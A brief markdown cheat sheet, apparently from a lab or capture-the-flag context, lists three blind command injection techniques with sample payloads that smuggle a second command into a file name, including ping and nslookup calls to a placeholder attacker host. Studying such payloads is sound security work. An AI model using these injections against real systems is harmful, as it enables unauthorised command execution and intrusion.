# Blind Command Injection Pocs

### 1. Time delays:

![image](https://user-images.githubusercontent.com/61876488/139537900-93a03486-f29f-4918-a1cc-707703e26cea.png)

Sample payload: `flag.txt & ping -c 20 <domain/ ip of attacker> &`

### 2. Redirecting output:

![image](https://user-images.githubusercontent.com/61876488/139538293-b20d50c2-eb6a-45a9-b35d-830fa38849aa.png)

Sample payload: `flag.txt & <command> > log.txt &`

### 3. Out-of-band:

![image](https://user-images.githubusercontent.com/61876488/139538515-f8e02364-bfb7-4500-b25b-fd1d84a8af90.png)

Sample payload: `flag.txt & nslookup <domain/ ip of attacker> &`
